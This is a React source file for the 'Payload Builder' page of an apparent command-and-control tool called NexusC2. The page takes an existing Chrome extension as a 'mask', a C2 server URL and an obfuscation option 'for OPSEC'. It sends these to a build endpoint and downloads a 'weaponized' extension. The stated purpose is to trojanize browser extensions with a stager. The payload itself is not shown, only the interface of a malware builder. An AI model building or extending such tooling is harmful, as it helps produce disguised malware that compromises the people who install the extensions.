"use client";

import { useState } from "react";

export default function BuilderPage() {
    const [maskFile, setMaskFile] = useState<File | null>(null);
    const [c2Url, setC2Url] = useState("http://localhost:3000");
    const [obfuscate, setObfuscate] = useState(true);
    const [isBuilding, setIsBuilding] = useState(false);
    const [error, setError] = useState("");

    const handleBuild = async (e: React.FormEvent) => {
        e.preventDefault();
        setError("");

        if (!maskFile) {
            setError("Please upload a mask extension ZIP file.");
            return;
        }

        setIsBuilding(true);
        try {
            const formData = new FormData();
            formData.append("mask", maskFile);
            formData.append("c2_url", c2Url);
            formData.append("obfuscate", String(obfuscate));

            const response = await fetch("/api/build", {
                method: "POST",
                body: formData,
            });

            if (!response.ok) {
                const data = await response.json();
                throw new Error(data.error || "Failed to build payload");
            }

            // Trigger file download
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `weaponized_${maskFile.name}`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (err: any) {
            setError(err.message);
        } finally {
            setIsBuilding(false);
        }
    };

    return (
        <div className="p-6 max-w-4xl mx-auto">
            <h1 className="text-3xl font-bold mb-2">Payload Builder</h1>
            <p className="text-gray-400 mb-8">
                Automatically trojanize an existing Chrome extension with the NexusC2 stager.
            </p>

            <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
                <form onSubmit={handleBuild} className="space-y-6">
                    <div>
                        <label className="block text-sm font-medium mb-2">Mask Extension (ZIP Archive)</label>
                        <div className="flex items-center">
                            <label className="cursor-pointer py-2 px-4 rounded-md text-sm font-semibold bg-blue-600 text-white hover:bg-blue-700 transition-colors inline-block mr-4">
                                Choose File
                                <input
                                    type="file"
                                    accept=".zip"
                                    onChange={(e) => setMaskFile(e.target.files?.[0] || null)}
                                    className="hidden"
                                />
                            </label>
                            <span className="text-sm text-gray-400">
                                {maskFile ? maskFile.name : "No file chosen"}
                            </span>
                        </div>
                    </div>

                    <div>
                        <label className="block text-sm font-medium mb-2">Target C2 URL</label>
                        <input
                            type="url"
                            value={c2Url}
                            onChange={(e) => setC2Url(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
                            placeholder="https://your-c2-domain.com"
                            required
                        />
                    </div>

                    <div className="flex items-center">
                        <input
                            type="checkbox"
                            checked={obfuscate}
                            onChange={(e) => setObfuscate(e.target.checked)}
                            className="h-4 w-4 bg-gray-900 border-gray-700 rounded text-blue-600 focus:ring-blue-500"
                        />
                        <label className="ml-2 block text-sm">
                            Apply JavaScript Obfuscation (Recommended for OPSEC)
                        </label>
                    </div>

                    {error && (
                        <div className="bg-red-900/50 border border-red-500 text-red-200 p-4 rounded-md text-sm">
                            {error}
                        </div>
                    )}

                    <button
                        type="submit"
                        disabled={isBuilding}
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-md transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        {isBuilding ? "Building Payload..." : "Build Weaponized Extension"}
                    </button>
                </form>
            </div>
        </div>
    );
}

